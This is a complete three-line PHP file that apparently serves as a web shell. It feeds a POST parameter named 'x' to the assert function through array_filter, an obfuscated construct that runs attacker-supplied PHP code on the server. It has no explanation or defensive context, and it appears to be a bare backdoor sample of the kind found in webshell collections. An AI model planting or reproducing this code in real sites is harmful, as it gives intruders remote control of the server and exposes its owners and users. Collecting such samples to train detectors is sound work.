<?php
    array_filter(array($_POST['x']),'assert');
?>
